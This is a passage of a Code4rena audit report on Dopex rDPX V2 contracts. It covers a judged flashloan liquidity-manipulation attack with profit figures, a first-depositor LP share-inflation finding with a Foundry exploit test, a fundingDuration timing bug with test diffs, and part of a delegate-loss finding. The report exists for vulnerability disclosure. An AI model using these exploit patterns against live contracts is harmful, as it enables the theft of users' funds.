> As mentioned in my submission, in this case, the attacker has control of the trade size of removeLiquidity() via bond() amount. By increasing the bond amount, which increase amount of LP tokens to remove, the attacker can increase the profitability of the attack.
> 
> **4. During the bootstrap phase, majority of LP holders are dopex funds/partners**
> The docs stated that during bootstrap phase, Dopex Treasury funds and Partners will partake in the dpxETH bonding first to ensure sufficient dpxETH in circulation. In addition, the backing reserve will be used to seed the liquidity for the Uniswap V2 Pool. So during that period, there are little other LP holders. I did not state this in submission as it is already in the docs.<br>
> https://dopex.notion.site/rDPX-V2-RI-b45b5b402af54bcab758d62fb7c69cb4 (see Launch Details)

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1778702756):**
 > @peakbolt 
> - What's the value in Pool?
> - Can you repeat the attack more than once?
> - What's the profit / value drained per iteration?
> - What's the threshold of TVL before the attack is profitable given 30BPS swap fees?

**[peakbolt (warden) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1779856524):**
 > Hi @Alex the Entreprenerd, 
> 
> I have adjusted the POC to a liquidity pool value of ~800 ETH with flashloan attack amount of 15e20 and ran it to provide the answers below. Used 800ETH TVL as the assumed amount to bootstrap, judging by the lower range of TVL in the top uniswap pools. Note that the initial TVL value in the test suite is actually 4000 ETH.<br>
> See link for updated poc: https://gist.github.com/peakbolt/a8fdbe18759ac2e25d15716af6faa76b.
> 
> 1. Yes, it is possible to repeat the attack more than once by bonding multiple times to trigger consecutive removal of liquidity after imbalancing the pool. 
> - Printout for the updated poc below, shows an attack with 5 `bond()` iterations. 
> - Beyond 5 `bond()` will hit a revert as there will be insufficient WETH collateral in `PerpetualAltanticVault` for purchase of put options (during bonding). 
> - The attacker can workaround that by waiting for users to deposit more WETH into PerpetualAltanticVault before carrying out the attack.
> 
> ```
>   Total Liquidity (in WETH) for RDPX/WETH UniswapV2 Pool (before attack): 804803971980485176292 
>   attacker weth balance (initial) : 1500000000000000000000 [from flashloan]
>   attacker rdpx balance (initial) : 0
>   bond() Iteration 1
>   bond() Iteration 2
>   bond() Iteration 3
>   bond() Iteration 4
>   bond() Iteration 5
>   attacker profit in WETH (after repaying flashloan): 22067892940781745930
> ```
> 
> 2. Based on the poc (~800ETH TVL), the attack with 5 iterations will gain ~22 ETH (inclusive of swap fees as shown in POC using Arb mainnet fork). 
> - For 800 ETH TVL, the flash loan cost for attack is lower at 1.35 ETH (0.09% of 15e20 ETH)
> - After flash loan cost profit will be 22-1.35 = 20.65 ETH
> - That works out to be 20.65/800 ETH = ~2.58% profit/TVL. 
> - Per iteration will be 0.516% profit/TVL.
> 
> - For bonding, it will require upfront capital of 1e20 WETH/iteration to bond the dpxETH, which can be recouped by selling the dpxETH later on. To keep it simple, I have omitted the loan cost for this and assume attacker has the capital. Otherwise, attacker can get a loan and reduces attack profit. 
> 
> 3. As for the TVL threshold, I have tried lower TVL at 400 ETH and attack is still viable, with a profit 11.32 ETH (12.04 ETH - flash loan cost of 0.72 ETH). Did not try lower as I assume protocol will not bootstrap lower than that. Though profit is still possible to a certain extent, but likely insignificant.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1781331660):**
 > The finding shows that the attacker has access to the "button", this allows them to cause the contract to auto-rebalance.
> 
> The auto-rebalancing is part of the "button" that attack can trigger.
> 
> Initially I believed that the attacker only had control over the amounts from remove liquidity, which by definition will give pro-rata of the tokens.
> 
> The pro-rata can be manipulated based on attacking the `X * Y = k` uniswap invariant to have the contract take a loss that is relative to the new spot balance, vs the fair LP pricing.
> 
> That was Medium Severity imo and most Judges would agree with me, however, after talking with 2 more judges, we agreed that the code also impacts the rebalancing, done via `swapExactTokensForTokens` meaning that the attacker is not only causing the "skimmin" of the LP token value, they are able to influence the swap via `swapExactTokensForTokens`.
> 
> However, upon further inspection, that is protected by the Oracle Pricing, which could be argued to protect against it.
> 
> That said, the default slippage protection is 50 BPS, which is above the 30BPS avg cost of a swap on UnIV2, the oracles also can have drift which in general should make the cost of backrunning sustainable.
> 
> The profit of the attack would come due to:
> -> Swap taking a Loss -> generally seen as Med but since it's repeatable High is acceptable
> -> Ability to trigger the Withdrawal at any time, which causes the Pro-Rata received `X * Y` being less valuable than the fair valuation of the LP Token.
> 
> This means that under most circumnstances, a risk free trade is available for attacker at the detriment of the `reLP` contract, leading me to believe High Severity to be appropriate.
> 
> However, given the circumnstances, and given the original submission did not contain the POC, also considering that the POC shows an impact of 2% of funds, I'm maintaining Medium Severity due to the POC not being present in the original submission.


***

## [[M-09]  A malicious early depositor can manipulate the `LP-Token` price per share to take an unfair share of future user deposits ](https://github.com/code-423n4/2023-08-dopex-findings/issues/863)
*Submitted by [0xWagmi](https://github.com/code-423n4/2023-08-dopex-findings/issues/863), also found by [Matin](https://github.com/code-423n4/2023-08-dopex-findings/issues/2230), [vangrim](https://github.com/code-423n4/2023-08-dopex-findings/issues/1947), [catellatech](https://github.com/code-423n4/2023-08-dopex-findings/issues/1877), [MohammedRizwan](https://github.com/code-423n4/2023-08-dopex-findings/issues/1516), [Hama](https://github.com/code-423n4/2023-08-dopex-findings/issues/1319), [836541](https://github.com/code-423n4/2023-08-dopex-findings/issues/1263), [okolicodes](https://github.com/code-423n4/2023-08-dopex-findings/issues/1223), [Inspecktor](https://github.com/code-423n4/2023-08-dopex-findings/issues/1207), [erebus](https://github.com/code-423n4/2023-08-dopex-findings/issues/908), [GangsOfBrahmin](https://github.com/code-423n4/2023-08-dopex-findings/issues/907), [Bauchibred](https://github.com/code-423n4/2023-08-dopex-findings/issues/894), [lsaudit](https://github.com/code-423n4/2023-08-dopex-findings/issues/698), [ravikiranweb3](https://github.com/code-423n4/2023-08-dopex-findings/issues/615), [zaevlad](https://github.com/code-423n4/2023-08-dopex-findings/issues/531), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/461), [niki](https://github.com/code-423n4/2023-08-dopex-findings/issues/400), and [IceBear](https://github.com/code-423n4/2023-08-dopex-findings/issues/573)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L283>

A  malicious early depositor can profit from future depositors' deposits. While the late depositors will lose part of their funds to the attacker.

### Vulnerability Details

The first depositor can buy a small number of shares and next he should wait until   owner  settle an options through `RdpxCore` so it will result in calling `addRDPX` in `PerpetualAtlanticVaultLP` by transfering rdpxTokens into it and updating `_rdpxCollateral`, as `rdpx Token` has 18 decimals `https://arbiscan.io/token/0x32eb7902d4134bf98a28b963d26de779af92a212` even small amount of rdpx token result in giving a higher `totalVaultCollateral()` so then it calculates `assets.mulDivDown(supply,totalVaultCollateral);` , then it  will make shares very expensive for the next depositors,

### POC

`copy this test into  /tests/perp-vault/Integration.t.sol`<br>
`forge test --match-path  ./tests/perp-vault/Integration.t.sol   -vvvv`

```js
 function test_second_user_loss_share() external {
  //=============================
  address  hecer  = makeAddr("Hecer");
  address  investor = makeAddr("investor");
  //=============================

 setApprovals(hecer);
 setApprovals(investor);

    mintWeth(1 wei, hecer); // hecker starts with 1 wei 🐱‍👤
    mintWeth(20 ether, investor);
 
 
 console.log("WETH Balance Of attacker before " , weth.balanceOf(hecer));          
   console.log("RDPX Balance Of attacker before " ,rdpx.balanceOf(hecer));
    deposit(1 wei, hecer);

    //===============================================================================================================
    /* This step isn't possible like this owner should call  `settle` in RdpxV2Core , but for the simplicity lets say
        10 rdpx tokens transfered into vaultLP   after hecer deposit 1 wei of weth and get 1 share 
    */ 
    deal(address(rdpx),address(vaultLp),10 ether);  // 10 tokens because rpdx 18 decimals // 0x32eb7902d4134bf98a28b963d26de779af92a212 
    vm.prank(address(vault));
    vaultLp.addRdpx(10 ether);
//===============================================================================================================
//   Then the investor deposits  20 ether 
    deposit(20 ether, investor);
    
    uint256 userBalance = vaultLp.balanceOf(hecer);
    uint256 userBalance2 = vaultLp.balanceOf(investor);
    console.log("Lp-balance Of attacker : %s share " , userBalance);
    console.log("Lp-balance Of investor : %s share " , userBalance2);
          // (uint asset , uint rdpxA)= vaultLp.redeemPreview(uint256(1));
    vm.prank(hecer);
    vaultLp.redeem(uint256(1),hecer,hecer);

   console.log("WETH Balance Of attacker after" , weth.balanceOf(hecer));  //Starting with 1wei attacker🐱‍👤 endUp with 2 wrapped ether ;    
   console.log("RDPX Balance Of attacker after" ,rdpx.balanceOf(hecer));        
  }

```

### Tools used

 Foundry

### Recommendation

Consider requiring a minimal amount of share tokens to be minted for the first minter

**[witherblock (Dopex) acknowledged and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1734043995):**
 > We have planned to be the first depositors for this vault to prevent this issue.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1759179100):**
 > Given the fact that:
> - Rebase is possible (good old ERC4626 attack)
> - Impact is existant
> - Deployment is Permissioned
> 
> Medium severity seems appropriate.

***

## [[M-10] Change of `fundingDuration` causes "time travel" of `PerpetualAtlanticVault.nextFundingPaymentTimestamp()`](https://github.com/code-423n4/2023-08-dopex-findings/issues/850)
*Submitted by [0xTheC0der](https://github.com/code-423n4/2023-08-dopex-findings/issues/850), also found by [nirlin](https://github.com/code-423n4/2023-08-dopex-findings/issues/2178), [\_\_141345\_\_](https://github.com/code-423n4/2023-08-dopex-findings/issues/2139), QiuhaoLi ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/2109), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1967)), [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1807), [0xbranded](https://github.com/code-423n4/2023-08-dopex-findings/issues/1614), [jasonxiale](https://github.com/code-423n4/2023-08-dopex-findings/issues/1556), [0Kage](https://github.com/code-423n4/2023-08-dopex-findings/issues/1554), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1362), [836541](https://github.com/code-423n4/2023-08-dopex-findings/issues/1244), [joaovwfreire](https://github.com/code-423n4/2023-08-dopex-findings/issues/1194), [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/980), [ABA](https://github.com/code-423n4/2023-08-dopex-findings/issues/947), [alexfilippov314](https://github.com/code-423n4/2023-08-dopex-findings/issues/897), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/842), [ayden](https://github.com/code-423n4/2023-08-dopex-findings/issues/773), [0xDING99YA](https://github.com/code-423n4/2023-08-dopex-findings/issues/692), [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/638), [chaduke](https://github.com/code-423n4/2023-08-dopex-findings/issues/612), [SpicyMeatball](https://github.com/code-423n4/2023-08-dopex-findings/issues/556), [degensec](https://github.com/code-423n4/2023-08-dopex-findings/issues/154), [Kow](https://github.com/code-423n4/2023-08-dopex-findings/issues/142), [rvierdiiev](https://github.com/code-423n4/2023-08-dopex-findings/issues/125), [0xHelium](https://github.com/code-423n4/2023-08-dopex-findings/issues/53), and [tnquanghuy0512](https://github.com/code-423n4/2023-08-dopex-findings/issues/1092)*

The return value of [PerpetualAtlanticVault.nextFundingPaymentTimestamp()](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569), which marks the beginning of the next funding epoch, scales linearly with the current `fundingDuration`. (Note that `latestFundingPaymentPointer` is strictly monotonically increasing with each epoch.)\
Therefore, epochs are separated by a period of `fundingDuration`.

```solidity
  function nextFundingPaymentTimestamp()
    public
    view
    returns (uint256 timestamp)
  {
    return genesis + (latestFundingPaymentPointer * fundingDuration);
  }
```

However, the owner can change the `fundingDuration` at any time via [PerpetualAtlanticVault.updateFundingDuration(...)](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L233-L241) which is an **intended feature** of the contract, otherwise the funding duration would be **immutable**.

### First order consequences

Assume the owner changes the `fundingDuration` by a value `delta`, such that: `new fundingDuration = old fundingDuration + delta`.
As a result, the return value of [PerpetualAtlanticVault.nextFundingPaymentTimestamp()](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569) moves by a value of `latestFundingPaymentPointer  * delta` into the **future** or **past** (depending on the sign of `delta`).

*Numerical example:*
The `fundingDuration = 7 days` and is slightly reduced by `delta = -1 hour`.\
The protocol is alread live for nearly 2 years, therefore `latestFundingPaymentPointer = 96`.\
Consequently, the next funding epoch "begins" `latestFundingPaymentPointer  * delta = -96 hours = -4 days` in the **past**.

The [PerpetualAtlanticVault.nextFundingPaymentTimestamp()](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569) is called at **14 instances** throughout the `PerpetualAtlanticVault` contract and once by the `RdpxV2Core` contract for bonding cost calculation, see [RdpxV2Core.calculateBondCost(...)](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1192-L1194).

### Second order consequences

Due the scattered impacts of the present bug, there arise multiple problems. Nevertheless, this report solely focuses on the following consquences in order to emphasize the severity of this issue.

### [PerpetualAtlanticVault.updateFundingPaymentPointer()](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L461-L496)

This helper method is (implicitly) called by the `updateFunding()`, `purchase(...)`, `settle(...)` and `calculateFunding(...)` methods, but not by the `payFunding()` method of the contract.\
It is responsible for iteratively bringing the `latestFundingPaymentPointer` into the present while funding the LP with collateral for each epoch.

In case of "time travel" by changing the `fundingDuration` it will do the following:

*   `nextFundingPaymentTimestamp()` lies in the past: It will iterarte until `nextFundingPaymentTimestamp()` lies in the future, thereby **immediately** ending the current epoch and skipping the following ones, see PoC.
*   `nextFundingPaymentTimestamp()` lies in the future: Once the overly long epoch `old fundingDuration + delta * latestFundingPaymentPointer` expires, it will **overpay** collateral for this epoch to the LP, see [L473-L477](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L473-L477).

### [PerpetualAtlanticVault.purchase(...)](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L254-L312)

This method is called by the core contract when bonding in order to buy options. Thereby the option premium is heavily dependent on the return value of `nextFundingPaymentTimestamp()`, see [L283-L286](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L283-L286).

In case of an overly long epoch `old fundingDuration + delta * latestFundingPaymentPointer` due to an increase of the `fundingDuration` by `delta`, the option premium is excessively increased leading to a loss of funds for the user/protocol by using up a great part of the reserve WETH for the option, see core contract [L918-L924](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L918-L924) and PoC.\
Subsequently the bonding gets more expensive, i.e. the user has to supply more WETH, see also [RdpxV2Core.calculateBondCost(...)](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1192-L1198).

For reference, the correct epoch duration in this case should be `old fundingDuration + delta`.\
The affected entry point methods are [RdpxV2Core.bond(...)](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L887-L933) and [RdpxV2Core.bondWithDelegate(...)](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L810-L885).\
This is also time critical in another way, since the user cannot know if the `fundingDuration` was changed **after** calculating the bonding cost via [RdpxV2Core.calculateBondCost(...)](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1192-L1198), but **before** his bonding transaction.

### Conclusion

The resulting funding period / epoch inconsistencies by jumping in time, as well as the execessivley overpriced options, which do lead to loss of funds when bought during that epoch, are sufficient to strongly disincentivize users from bonding. This consequently endagers the peg which can be considered the most valuable asset of the protocol.

Futhermore, the user cannot know if the `fundingDuration` was changed before his transaction is executed which poses an additional risk.

### Proof of Concept

In order to prove the above claims, three new test cases were added. The last assertion in each of those cases fails in order to demonstrate the issues.

*   `testUpdateFundingPaymentPointerPast()`: The return value of `nextFundingPaymentTimestamp()` lies in the past and multiple epochs are skipped on `updateFundingPaymentPointer()`.
*   `testUpdateFundingPaymentPointerPast()`: The return value of `nextFundingPaymentTimestamp()` lies in the future, therefore the current epoch is overly long and won't change on `updateFundingPaymentPointer()` after waiting for `new fundingDuration`.
*   `testPurchaseExtendedEpoch()`: Shows the excessive increase in option premium on a slight increase of `fundingDuration`, i.e. unjustified overuse/loss of funds.

Just apply the *diff* below and run the test cases with `forge test -vv --match-test testUpdateFundingPaymentPointer` and `forge test -vv --match-test testPurchaseExtendedEpoch`:

<details>

```diff
diff --git a/contracts/mocks/MockOptionPricing.sol b/contracts/mocks/MockOptionPricing.sol
index 5b77b16..c8e92f1 100644
--- a/contracts/mocks/MockOptionPricing.sol
+++ b/contracts/mocks/MockOptionPricing.sol
@@ -8,8 +8,8 @@ contract MockOptionPricing is IOptionPricing {
     uint256,
     uint256,
     uint256,
-    uint256
+    uint256 timeToExpiry
   ) external pure override returns (uint256) {
-    return 5e6; // 0.05 weth
+    return 5e6 * timeToExpiry / 1 days; // 0.05 weth
   }
 }
diff --git a/tests/perp-vault/Unit.t.sol b/tests/perp-vault/Unit.t.sol
index c8016e0..dcfd72a 100644
--- a/tests/perp-vault/Unit.t.sol
+++ b/tests/perp-vault/Unit.t.sol
@@ -108,6 +108,33 @@ contract Unit is ERC721Holder, Setup {
     vault.purchase(300 ether, address(this));
   }
 
+  function testPurchaseExtendedEpoch() external {
+    testDeposit();
+
+    skip(vault.fundingDuration() * 10); // expire 10 epochs
+    vault.updateFundingPaymentPointer();
+
+    uint256 timeTillExpiry = vault.nextFundingPaymentTimestamp() -
+      block.timestamp;
+
+    // uses calculates expected option premium
+    uint256 expectedPremium = vault.calculatePremium(
+      0.015 gwei,
+      500 ether,
+      timeTillExpiry,
+      0.02 gwei
+    );
+    
+    // owner happends to extend funding duration --> severely increases option premium
+    vault.updateFundingDuration(vault.fundingDuration() + 1 hours);  // comment this line to see test case pass
+
+    // user doesn't know about the bug and funding duration change --> overpays for option
+    (uint256 paidPremium, ) = vault.purchase(500 ether, address(this));
+
+    assertEq(paidPremium, expectedPremium);
+  }
+
+
   function testCalculatePremium() external {
     uint256 pnl = vault.calculatePnl(0.01 gwei, 0.015 gwei, 1 ether);
     assertEq(pnl, 0.05 ether);
@@ -291,6 +318,47 @@ contract Unit is ERC721Holder, Setup {
     assertEq(pointer, 2);
   }
 
+  function testUpdateFundingPaymentPointerPast() external {
+    uint256 pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 0);
+    skip(vault.fundingDuration()); // expire
+    vault.updateFundingPaymentPointer();
+    pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 1);
+
+    skip(vault.fundingDuration()*95);
+    purchaseOneOption(); // updates payment pointer if block.timestamp > nextFundingPaymentTimestamp
+    pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 96);
+
+    vault.updateFundingDuration(vault.fundingDuration() - 1 hours); // reduce funding duration by 1 hour
+    skip(vault.fundingDuration()); // expire
+    vault.updateFundingPaymentPointer();  // updates payment pointer if block.timestamp > nextFundingPaymentTimestamp
+    pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 97); // fails: we would expect 97 but actually skipped 4 epochs due to "time traveling"
+  }
+
+  function testUpdateFundingPaymentPointerFuture() external {
+    uint256 pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 0);
+    skip(vault.fundingDuration()); // expire
+    vault.updateFundingPaymentPointer();
+    pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 1);
+
+    skip(vault.fundingDuration()*95);
+    purchaseOneOption(); // updates payment pointer if block.timestamp > nextFundingPaymentTimestamp
+    pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 96);
+
+    vault.updateFundingDuration(vault.fundingDuration() + 1 hours); // increase funding duration by 1 hour
+    skip(vault.fundingDuration()); // expire
+    vault.updateFundingPaymentPointer();  // updates payment pointer if block.timestamp > nextFundingPaymentTimestamp
+    pointer = vault.latestFundingPaymentPointer();
+    assertEq(pointer, 97); // fails: we would expect 97 but it's still 96 because the next epoch lies 4 days in the future
+  }
+
+
   function testMockups() external {
     deposit(1 ether, address(this));
     assertEq(vaultLp.totalCollateral(), 1 ether);

```

</details>

### Recommended Mitigation Steps

Option 1 - Complete Fix:
Reconsider if it is really necessary for the protocol to change the funding duration throughout its lifecycle. If no, declare the `fundingDuration` as `immutable`.

Option 2 - Mitigation:
Store the `lastFundingPaymentTimestamp` and incease it by `fundingDuration` in `updateFundingPaymentPointer()` on each new epoch to accomplish the expected timing behaviour.\
Note that the scaling issue does not only appear in [PerpetualAtlanticVault.nextFundingPaymentTimestamp()](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569), but also in [L426-427](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L426-L427).

**[Alex the Entreprenerd (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/850#issuecomment-1772543256):**
 > Good discussion of consequences + POC.

**[witherblock (Dopex) confirmed via duplicate issue 980](https://github.com/code-423n4/2023-08-dopex-findings/issues/980)**

***

## [[M-11] User that delegate eth to `RdpxV2Core` will incur loss if his delegated eth fulfilled by decaying bonds](https://github.com/code-423n4/2023-08-dopex-findings/issues/780)
*Submitted by [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/780), also found by [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/2187) and [HChang26](https://github.com/code-423n4/2023-08-dopex-findings/issues/303)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L843-L847> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L699-L744>

Current design allow user call `bondWithDelegate` using decaying bonds, this will make delegatee incur loss because they will get less bond and paid more eth.

### Proof of Concept

When users have decaying bonds, they can either utilize it via `bond` or `bondWithDelegate`. If user choose to use `bondWithDelegate`, they need to provide `_delegateIds` (delegated eth that can fulfill the request).

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L819-L885>

<details>

```solidity
  function bondWithDelegate(
    address _to,
    uint256[] memory _amounts,
    uint256[] memory _delegateIds,
    uint256 rdpxBondId
  ) public returns (uint256 receiptTokenAmount, uint256[] memory) {
    _whenNotPaused();
    // Validate amount
    _validate(_amounts.length == _delegateIds.length, 3);

    uint256 userTotalBondAmount;
    uint256 totalBondAmount;

    uint256[] memory delegateReceiptTokenAmounts = new uint256[](
      _amounts.length
    );

    for (uint256 i = 0; i < _amounts.length; i++) {
      // Validate amount
      _validate(_amounts[i] > 0, 4);

      BondWithDelegateReturnValue
        memory returnValues = BondWithDelegateReturnValue(0, 0, 0, 0);

>>>   returnValues = _bondWithDelegate(
        _amounts[i],
        rdpxBondId,
        _delegateIds[i]
      );

      delegateReceiptTokenAmounts[i] = returnValues.delegateReceiptTokenAmount;

      userTotalBondAmount += returnValues.bondAmountForUser;
      totalBondAmount += _amounts[i];

      // purchase options
      uint256 premium;
      if (putOptionsRequired) {
        premium = _purchaseOptions(returnValues.rdpxRequired);
      }

      // transfer the required rdpx
      _transfer(
        returnValues.rdpxRequired,
        returnValues.wethRequired - premium,
        _amounts[i],
        rdpxBondId
      );
    }

   // ....
  }
```

</details>

Then it will call `_bondWithDelegate` to calculate `rdpxRequired` and `wethRequired` and reduce delegatee provided collateral by increasing `activeCollateral` with  `wethRequired`. Then calculate the bond received by calling `_calculateAmounts`, this will based on `delegate.fee`, `wethRequired` and `rdpxRequired`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L699-L744>

<details>

```solidity
  function _bondWithDelegate(
    uint256 _amount,
    uint256 rdpxBondId,
    uint256 delegateId
  ) internal returns (BondWithDelegateReturnValue memory returnValues) {
    // Compute the bond cost
>>> (uint256 rdpxRequired, uint256 wethRequired) = calculateBondCost(
      _amount,
      rdpxBondId
    );

    // update ETH token reserve
    reserveAsset[reservesIndex["WETH"]].tokenBalance += wethRequired;

    Delegate storage delegate = delegates[delegateId];

    // update delegate active collateral
    _validate(delegate.amount - delegate.activeCollateral >= wethRequired, 5);
    delegate.activeCollateral += wethRequired;

    // update total weth delegated
    totalWethDelegated -= wethRequired;

    // Calculate the amount of bond token to mint for the delegate and user based on the fee
>>> (uint256 amount1, uint256 amount2) = _calculateAmounts(
      wethRequired,
      rdpxRequired,
      _amount,
      delegate.fee
    );

    // update user amounts
    // ETH token amount remaining after LP for the user
    uint256 bondAmountForUser = amount1;

    // Mint bond token for delegate
    // ETH token amount remaining after LP for the delegate
    uint256 delegateReceiptTokenAmount = _stake(delegate.owner, amount2);

    returnValues = BondWithDelegateReturnValue(
      delegateReceiptTokenAmount,
      bondAmountForUser,
      rdpxRequired,
      wethRequired
    );
  }
```
</details>

If user using decaying bonds, when call `calculateBondCost` and calculating `rdpxRequired` and `wethRequired`, it will not use any discount, this will make `wethRequired` even more bigger considering that if `putOptionsRequired` is `true`. delegatee need to paid premium that based on `rdpxRequired` (that not discounted).

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1156-L1199>

<details>

```solidity
  function calculateBondCost(
    uint256 _amount,
    uint256 _rdpxBondId
  ) public view returns (uint256 rdpxRequired, uint256 wethRequired) {
    uint256 rdpxPrice = getRdpxPrice();

    if (_rdpxBondId == 0) {
      uint256 bondDiscount = (bondDiscountFactor *
        Math.sqrt(IRdpxReserve(addresses.rdpxReserve).rdpxReserve()) *
        1e2) / (Math.sqrt(1e18)); // 1e8 precision

      _validate(bondDiscount < 100e8, 14);

      rdpxRequired =
        ((RDPX_RATIO_PERCENTAGE - (bondDiscount / 2)) *
          _amount *
          DEFAULT_PRECISION) /
        (DEFAULT_PRECISION * rdpxPrice * 1e2);

      wethRequired =
        ((ETH_RATIO_PERCENTAGE - (bondDiscount / 2)) * _amount) /
        (DEFAULT_PRECISION * 1e2);
    } else {
      // if rdpx decaying bonds are being used there is no discount
      rdpxRequired =
        (RDPX_RATIO_PERCENTAGE * _amount * DEFAULT_PRECISION) /
        (DEFAULT_PRECISION * rdpxPrice * 1e2);

>>>   wethRequired =
        (ETH_RATIO_PERCENTAGE * _amount) /
        (DEFAULT_PRECISION * 1e2);
    }

    uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
      .roundUp(rdpxPrice - (rdpxPrice / 4)); // 25% below the current price

    uint256 timeToExpiry = IPerpetualAtlanticVault(
      addresses.perpetualAtlanticVault
    ).nextFundingPaymentTimestamp() - block.timestamp;
    if (putOptionsRequired) {
>>>   wethRequired += IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
        .calculatePremium(strike, rdpxRequired, timeToExpiry, 0);
    }
  }
```
</details>

This means, delegatee need to paid undiscounted `wethRequired` plus undiscounted premium!

This will make delegatee would not want to fulfill `bondWithDelegate` when decaying bond is used. Delegatee can front-run by withdrawing his delegated assets before `bondWithDelegate`  with using decaying bonds calls.

PoC Foundry :

Comparing fulfilling `bondWithDelegate` requests in 2 scenarios, with decaying bonds and non-decaying bonds.

Add this test to `Unit` contract inside `/tests/rdpxV2-core/Unit.t.sol`, also add `import "forge-std/console.sol";` in the contract :

<details>

```solidity
   function testBondWithDelegateCompare() public {
        address alice = makeAddr("alice");
        rdpx.mint(alice, 1000 * 1e18);

        // test with rdpx decaying bonds
        rdpxDecayingBonds.grantRole(
            rdpxDecayingBonds.MINTER_ROLE(),
            address(this)
        );
        rdpxDecayingBonds.mint(alice, block.timestamp + 10, 125 * 1e16);
        assertEq(rdpxDecayingBonds.ownerOf(1), alice);
        /// add to delegate with different fees
        uint256 delegateId = rdpxV2Core.addToDelegate(50 * 1e18, 10 * 1e8);
        // uint256 delgateId2 = rdpxV2Core.addToDelegate(10 * 1e18, 20 * 1e8);

        // test bond with delegate
        uint256[] memory _amounts = new uint256[](1);
        uint256[] memory _delegateIds = new uint256[](1);
        _delegateIds[0] = 0;
        _amounts[0] = 1 * 1e18;

        // address 1 bonds
        /// check user balance
        uint256 userRdpxBalance = rdpx.balanceOf(alice);
        uint256 userWethBalance = weth.balanceOf(alice);

        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 0);

        vm.startPrank(alice);
        rdpx.approve(address(rdpxV2Core), type(uint256).max);

        (uint256 userAmount, uint256[] memory delegateAmounts) = rdpxV2Core
            .bondWithDelegate(alice, _amounts, _delegateIds, 0);
